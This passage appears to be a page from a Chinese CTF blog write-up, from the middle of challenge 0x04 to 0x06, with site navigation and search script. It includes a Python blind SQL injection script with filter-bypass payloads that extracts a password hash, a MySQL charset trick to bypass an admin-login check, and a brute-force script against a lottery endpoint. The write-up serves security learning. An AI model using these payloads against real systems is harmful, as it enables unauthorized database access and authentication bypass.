+    &lt;span class=&quot;hljs-variable&quot;&gt;$sql&lt;/span&gt; = &lt;span class=&quot;hljs-string&quot;&gt;&quot;select * from</code>user<code>where username=&#39;&quot;&lt;/span&gt;.&lt;span class=&quot;hljs-variable&quot;&gt;$conn&lt;/span&gt;-&amp;gt;escape_string(&lt;span class=&quot;hljs-variable&quot;&gt;$username&lt;/span&gt;).&lt;span class=&quot;hljs-string&quot;&gt;&quot;&#39; and passwd=&#39;&quot;&lt;/span&gt;.&lt;span class=&quot;hljs-variable&quot;&gt;$conn&lt;/span&gt;-&amp;gt;escape_string(&lt;span class=&quot;hljs-variable&quot;&gt;$passwd&lt;/span&gt;).&lt;span class=&quot;hljs-string&quot;&gt;&quot;&#39;&quot;&lt;/span&gt;;
+    &lt;span class=&quot;hljs-variable&quot;&gt;$res&lt;/span&gt; = &lt;span class=&quot;hljs-variable&quot;&gt;$conn&lt;/span&gt; -&amp;gt;query(&lt;span class=&quot;hljs-variable&quot;&gt;$sql&lt;/span&gt;);
+    &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;hljs-variable&quot;&gt;$res&lt;/span&gt;-&amp;gt;num_rows&amp;gt;&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;){
+        &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;hljs-variable&quot;&gt;$res&lt;/span&gt;-&amp;gt;fetch_assoc()[&lt;span class=&quot;hljs-string&quot;&gt;&#39;role&#39;&lt;/span&gt;] === &lt;span class=&quot;hljs-string&quot;&gt;&#39;admin&#39;&lt;/span&gt;) &lt;span class=&quot;hljs-keyword&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;hljs-variable&quot;&gt;$flag&lt;/span&gt;);
+    }&lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt;{
+       &lt;span class=&quot;hljs-keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;sorry,username or passwd error!&quot;&lt;/span&gt;;  
+    }
+
+}
+
+&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt;{&lt;/span&gt;
+
+    highlight_file(&lt;span class=&quot;hljs-keyword&quot;&gt;__FILE__&lt;/span&gt;);
+}
+
+&lt;span class=&quot;hljs-variable&quot;&gt;$username&lt;/span&gt; = &lt;span class=&quot;hljs-keyword&quot;&gt;isset&lt;/span&gt;(&lt;span class=&quot;hljs-variable&quot;&gt;$_POST&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;&#39;username&#39;&lt;/span&gt;])?filter(&lt;span class=&quot;hljs-variable&quot;&gt;$_POST&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;&#39;username&#39;&lt;/span&gt;]):&lt;span class=&quot;hljs-string&quot;&gt;&quot;&quot;&lt;/span&gt;;
+&lt;span class=&quot;hljs-variable&quot;&gt;$passwd&lt;/span&gt; = &lt;span class=&quot;hljs-keyword&quot;&gt;isset&lt;/span&gt;(&lt;span class=&quot;hljs-variable&quot;&gt;$_POST&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;&#39;passwd&#39;&lt;/span&gt;])?filter(&lt;span class=&quot;hljs-variable&quot;&gt;$_POST&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;&#39;passwd&#39;&lt;/span&gt;]):&lt;span class=&quot;hljs-string&quot;&gt;&quot;&quot;&lt;/span&gt;;
+
+&lt;span class=&quot;hljs-variable&quot;&gt;$action&lt;/span&gt; = &lt;span class=&quot;hljs-keyword&quot;&gt;isset&lt;/span&gt;(&lt;span class=&quot;hljs-variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;&#39;action&#39;&lt;/span&gt;])?filter(&lt;span class=&quot;hljs-variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;&#39;action&#39;&lt;/span&gt;]):&lt;span class=&quot;hljs-string&quot;&gt;&quot;source&quot;&lt;/span&gt;;
+
+&lt;span class=&quot;hljs-keyword&quot;&gt;switch&lt;/span&gt;(&lt;span class=&quot;hljs-variable&quot;&gt;$action&lt;/span&gt;){
+   &lt;span class=&quot;hljs-keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;source&quot;&lt;/span&gt;: source(); &lt;span class=&quot;hljs-keyword&quot;&gt;break&lt;/span&gt; ;
+   &lt;span class=&quot;hljs-keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;login&quot;&lt;/span&gt; : login(&lt;span class=&quot;hljs-variable&quot;&gt;$username&lt;/span&gt;,&lt;span class=&quot;hljs-variable&quot;&gt;$passwd&lt;/span&gt;);&lt;span class=&quot;hljs-keyword&quot;&gt;break&lt;/span&gt;;
+   &lt;span class=&quot;hljs-keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;show&quot;&lt;/span&gt; : show(&lt;span class=&quot;hljs-variable&quot;&gt;$username&lt;/span&gt;);&lt;span class=&quot;hljs-keyword&quot;&gt;break&lt;/span&gt;;
+}
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;需要注意以下几点 &lt;br&gt;
+1.数据库不会内容变 &lt;br&gt;
+2.show函数可以注入能用的字符串有select from () substr ’ &lt;br&gt;
+3.show 可以盲注&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;
+&lt;p&gt;盲注姿势 &lt;br&gt;
+1.绕过，利用&lt;code&gt;substr(user())from(1)&lt;/code&gt; &lt;br&gt;
+2.绕过空格 利用（） &lt;br&gt;
+3.闭合引号，因为没有注释符所以只能用连等式 &lt;br&gt;
+4.连接符选择 使用/连接&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;
+&lt;p&gt;首先找到盲注点 &lt;br&gt;
+&lt;img alt=&quot;这里写图片描述&quot; src=&quot;http://img.blog.csdn.net/20170417170034684?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast&quot; title=&quot;&quot;&gt; &lt;br&gt;
+写盲注脚本&lt;/br&gt;&lt;/img&gt;&lt;/br&gt;&lt;/p&gt;
+&lt;pre class=&quot;prettyprint&quot;&gt;&lt;code class=&quot; hljs livecodeserver&quot;&gt;import requests
+&lt;span class=&quot;hljs-keyword&quot;&gt;string&lt;/span&gt; = &lt;span class=&quot;hljs-string&quot;&gt;&#39;&#39;&lt;/span&gt;
+&lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;hljs-operator&quot;&gt;in&lt;/span&gt; range(&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;,&lt;span class=&quot;hljs-number&quot;&gt;33&lt;/span&gt;):
+    &lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; j &lt;span class=&quot;hljs-operator&quot;&gt;in&lt;/span&gt; range(&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;,&lt;span class=&quot;hljs-number&quot;&gt;126&lt;/span&gt;):
+        url=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://117.34.111.15:89/?action=show&quot;&lt;/span&gt;
+        s1 = &lt;span class=&quot;hljs-string&quot;&gt;&quot;admin&#39;/1=(ascii(substr((select(passwd)from(user))from({})))={})/&#39;1&#39;=&#39;1&quot;&lt;/span&gt;.&lt;span class=&quot;hljs-built_in&quot;&gt;format&lt;/span&gt;(str(i),j)
+        data = {
+            &lt;span class=&quot;hljs-string&quot;&gt;&#39;username&#39;&lt;/span&gt;:s1
+        }
+        s=requests.&lt;span class=&quot;hljs-built_in&quot;&gt;post&lt;/span&gt;(url=url,data=data)
+        content=s.content
+        &lt;span class=&quot;hljs-built_in&quot;&gt;length&lt;/span&gt;=&lt;span class=&quot;hljs-built_in&quot;&gt;len&lt;/span&gt;(content)
+        print &lt;span class=&quot;hljs-built_in&quot;&gt;length&lt;/span&gt;
+        &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;length&lt;/span&gt; != &lt;span class=&quot;hljs-number&quot;&gt;21&lt;/span&gt;:
+            &lt;span class=&quot;hljs-keyword&quot;&gt;string&lt;/span&gt;+=chr(j)
+            break
+    print &lt;span class=&quot;hljs-keyword&quot;&gt;string&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;password=37b1d2f04f594bfffc826fd69e389688 &lt;br&gt;
+下一步用password登录admin，但发现&lt;/br&gt;&lt;/p&gt;
+&lt;pre class=&quot;prettyprint&quot;&gt;&lt;code class=&quot; hljs lasso&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;hljs-variable&quot;&gt;$username&lt;/span&gt; &lt;span class=&quot;hljs-subst&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&#39;admin&#39;&lt;/span&gt;){
+        die(&lt;span class=&quot;hljs-string&quot;&gt;&quot;you can&#39;t login this as admin!&quot;&lt;/span&gt;);
+    }
+
+    &lt;span class=&quot;hljs-variable&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;hljs-subst&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;select * from</code>user` where username=’”</span><span class="hljs-built_in">.</span><span class="hljs-variable">$conn</span><span class="hljs-subst">-&gt;</span>escape_string(<span class="hljs-variable">$username</span>)<span class="hljs-built_in">.</span><span class="hljs-string">“‘ and passwd=’”</span><span class="hljs-built_in">.</span><span class="hljs-variable">$conn</span><span class="hljs-subst">-&gt;</span>escape_string(<span class="hljs-variable">$passwd</span>)<span class="hljs-built_in">.</span><span class="hljs-string">“‘“</span>;</span></code></pre><br><p>发现不能直接用admin登录 <br><br>必须利用字符集特征绕过此判断 <br><br><a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html" target="_blank" rel="external">P牛的文章</a> <br><br>就是admin%c2 在php中就不为admin，但在mysql查询的就是为admin，所以可以绕过 <br><br>原因就是Mysql字段的字符集和php mysqli客户端设置的字符集不相同。Mysql在转换字符集的时候，将不完整的字符给忽略了。 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170417170940407?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br><br><br><br><br></p><br><h1 id="0x05-继续抽">0x05 继续抽</h1><br><p>这道题和第一个抽抽奖相比质量高得多。 <br><br>首先经过调试发现运行机制<br></p><br><pre class="prettyprint"><code class=" hljs javascript">$(<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span>{</span><br>    <span class="hljs-keyword">var</span> rotateFunc=<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(jsctf0,jsctf1,jsctf2)</span>{</span><br>    $(<span class="hljs-string">‘#lotteryBtn’</span>).stopRotate();<br>    $(<span class="hljs-string">“#lotteryBtn”</span>).rotate({angle:<span class="hljs-number">0x0</span>,duration:<span class="hljs-number">0x1388</span>,animateTo:jsctf1+<span class="hljs-number">0x5a0</span>,callback:<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span>{</span><br>        $.get(<span class="hljs-string">‘get.php?token=’</span>+$(<span class="hljs-string">“#token”</span>).val()+<span class="hljs-string">“&amp;id=”</span>+encode(md5(jsctf2)),<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(jsctf3)</span>{</span>alert(jsctf3[<span class="hljs-string">‘text’</span>])},<span class="hljs-string">‘json’</span>);<br>    $.get(<span class="hljs-string">‘token.php’</span>,<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(jsctf3)</span>{</span>$(<span class="hljs-string">“#token”</span>).val(jsctf3)},<span class="hljs-string">‘json’</span>)<br>}})};<br>    $(<span class="hljs-string">“#lotteryBtn”</span>).rotate({bind:{click:<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span>{</span><br>        <span class="hljs-keyword">var</span> jsctf0=[<span class="hljs-number">0x0</span>];<br>        jsctf0=jsctf0[<span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.random()<em>jsctf0.length)];<br>        <span class="hljs-keyword">if</span>(jsctf0==<span class="hljs-number">0x1</span>){rotateFunc(<span class="hljs-number">0x1</span>,<span class="hljs-number">157</span>,<span class="hljs-string">‘1’</span>)};<br>        <span class="hljs-keyword">if</span>(jsctf0==<span class="hljs-number">0x2</span>){rotateFunc(<span class="hljs-number">0x2</span>,<span class="hljs-number">0xf7</span>,<span class="hljs-string">‘2’</span>)};<br>        <span class="hljs-keyword">if</span>(jsctf0==<span class="hljs-number">0x3</span>){rotateFunc(<span class="hljs-number">0x3</span>,<span class="hljs-number">0x16</span>,<span class="hljs-string">‘3’</span>)};<br>        <span class="hljs-keyword">if</span>(jsctf0==<span class="hljs-number">0x0</span>){<span class="hljs-keyword">var</span> jsctf1=[<span class="hljs-number">0x43</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0xca</span>,<span class="hljs-number">0x124</span>,<span class="hljs-number">0x151</span>];<br>            jsctf1=jsctf1[<span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.random()</em>jsctf1.length)];<br>        rotateFunc(<span class="hljs-number">0x0</span>,jsctf1,<span class="hljs-string">‘0’</span>)}}}})})</code></pre><br><p>jsctf 分别为0,1,2,3对应无，一等，二等，三等 <br><br>重点在这里<code>$.get(‘get.php?token=’+$(“#token”).val()+”&amp;id=”+encode(md5(jsctf2))</code> <br><br>token是本页面里的，下次发送数据需要使用，encode函数我们可通过调试得到<br><br></p><br><pre class="prettyprint"><code class=" hljs cs"><br>function encode(<span class="hljs-keyword">string</span>)<br>{<br>    <span class="hljs-keyword">var</span> output=<span class="hljs-string">‘’</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> x=<span class="hljs-number">0</span>,y=<span class="hljs-keyword">string</span>.length,charCode,hexCode;x&lt;y;++x)<br>        {<br>            charCode=<span class="hljs-keyword">string</span>.charCodeAt(x);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-number">128</span>&gt;charCode){charCode+=<span class="hljs-number">128</span>}<br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-number">127</span>&lt;charCode){charCode-=<span class="hljs-number">128</span>}<br>                charCode=<span class="hljs-number">255</span>-charCode;<br>                hexCode=charCode.toString(<span class="hljs-number">16</span>);<br>                <span class="hljs-keyword">if</span>(<span class="hljs-number">2</span>&gt;hexCode.length){hexCode=<span class="hljs-string">‘0’</span>+hexCode}<br>                    output+=hexCode}<br>    <span class="hljs-keyword">return</span> output<br>}</code></pre><br><p>下面就用python暴力跑一下</p><br><pre class="prettyprint"><code class=" hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span><span class="hljs-params">(str)</span>:</span><br>    <span class="hljs-keyword">import</span> hashlib<br>    m = hashlib.md5()<br>    m.update(str)<br>    <span class="hljs-keyword">return</span> m.hexdigest()<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode</span><span class="hljs-params">(string)</span>:</span><br>    output=<span class="hljs-string">‘’</span>;<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> string:<br>        charCode = ord(i)<br>        <span class="hljs-keyword">if</span> <span class="hljs-number">128</span> &gt; charCode:<br>            charCode+=<span class="hljs-number">128</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-number">127</span>&lt; charCode:<br>            charCode-=<span class="hljs-number">128</span><br>        charCode=<span class="hljs-number">255</span>-charCode;<br>        hexCode=hex(charCode)[<span class="hljs-number">2</span>:]<br>        <span class="hljs-keyword">if</span> <span class="hljs-number">2</span> &gt; len(hexCode):<br>            hexCode=<span class="hljs-string">‘0’</span>+hexCode<br>        output+=hexCode<br>    <span class="hljs-keyword">return</span> output<br><br>r = requests.session()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1000</span>):<br>    s = r.get(<span class="hljs-string">‘<a href="http://117.34.111.15:81/" target="_blank" rel="external">http://117.34.111.15:81/</a>‘</span>)<br>    soup = BeautifulSoup(s.content,<span class="hljs-string">‘lxml’</span>)<br>    token = soup.input[<span class="hljs-string">‘value’</span>]<br>    idt = encode(md5(str(i)))<br>    s1 = r.get(<span class="hljs-string">‘<a href="http://117.34.111.15:81/get.php?token=" target="_blank" rel="external">http://117.34.111.15:81/get.php?token=</a>‘</span>+token+<span class="hljs-string">‘&amp;id=’</span>+idt)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">‘flag{‘</span> <span class="hljs-keyword">in</span> json.loads(s1.content)[<span class="hljs-string">‘text’</span>]:<br>        <span class="hljs-keyword">print</span> json.loads(s1.content)[<span class="hljs-string">‘text’</span>]<br>        <span class="hljs-keyword">break</span><br></code></pre><br><h1 id="0x06-just-a-test">0x06 just a test</h1><br><p>直接AVWS扫描 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170424182028844?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>再接着用sqlmap跑一下 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170424203734920?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170424203746561?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170424204147957?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>发现并没有想要的字段 <br><br>可以报错注入 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170424205122533?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>这题想死的心都有了，浪费了好长时间 <br><br>flag{99cd1872c9b26525a8e5ec878d230caf}<br><br><br><br><br><br><br><br><br><br></p></div>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/write-up/" rel="tag"># write-up</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/04/03/操作系统实验报告 lab2/" rel="next" title="操作系统实验报告 lab2">
+                <i class="fa fa-chevron-left"></i> 操作系统实验报告 lab2
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/04/22/RSA 常见攻击方法/" rel="prev" title="RSA 常见攻击方法">
+                RSA 常见攻击方法 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/qq.jpg"
+                alt="4ct10n" />
+            
+              <p class="site-author-name" itemprop="name">4ct10n</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">53</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">分类</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/actionyz" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:act01n@163.com" target="_blank" title="E-Mail">
+                    
+                      <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://www.google.com" target="_blank" title="Google">
+                    
+                      <i class="fa fa-fw fa-google"></i>Google</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="1792034533" target="_blank" title="QQ">
+                    
+                      <i class="fa fa-fw fa-QQ"></i>QQ</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-签到题"><span class="nav-number">1.</span> <span class="nav-text">0x01 签到题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-抽抽奖"><span class="nav-number">2.</span> <span class="nav-text">0x02 抽抽奖</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-wrong"><span class="nav-number">3.</span> <span class="nav-text">0x03 Wrong</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-so-easy"><span class="nav-number">4.</span> <span class="nav-text">0x04 so easy!</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05-继续抽"><span class="nav-number">5.</span> <span class="nav-text">0x05 继续抽</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x06-just-a-test"><span class="nav-number">6.</span> <span class="nav-text">0x06 just a test</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">4ct10n</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
